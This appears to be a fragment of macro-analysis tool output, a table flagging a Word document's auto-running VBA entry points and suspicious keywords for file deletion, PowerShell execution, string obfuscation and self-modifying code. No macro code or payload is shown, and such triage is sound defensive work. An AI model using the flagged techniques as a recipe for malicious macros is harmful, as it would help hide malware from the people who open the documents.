|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |CommandButtonNothing|Runs when the file is opened and ActiveX     |
|          |_Click              |objects trigger events                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

